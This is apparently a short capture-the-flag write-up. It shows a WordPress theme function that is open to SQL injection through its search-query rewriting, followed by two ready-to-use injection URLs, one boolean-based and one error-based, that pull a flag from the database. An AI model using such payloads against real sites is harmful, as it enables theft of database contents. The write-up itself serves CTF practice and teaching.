**Vulnerable code** /bootstarter-4-wordpress-theme-master/inc/advanced-custom-fields-support.php:

```
function cf_search_where( $where ) {
    global $pagenow, $wpdb;

    if ( is_search() ) {
        $where = preg_replace(
            "/\(\s*".$wpdb->posts.".post_title\s+LIKE\s*(\'[^\']+\')\s*\)/",
            "(".$wpdb->posts.".post_title LIKE $1) OR (".$wpdb->postmeta.".meta_value LIKE $1)", $where );
    }

    return $where;
}
add_filter( 'posts_where', 'cf_search_where' );

```

**Boolean Based:**

```
http://blog.q.2019.volgactf.ru/?s=)))or(select`flag`from`flag`)like(0x566F6C67614354467B25)%23%27)&exact=1
```

**Error Based:**

```
http://blog.q.2019.volgactf.ru/?s=)))+union+select+extractvalue(1,concat(0x3a,(select+flag+from+flag)))+%23%27)&exact=1&sentence=1
```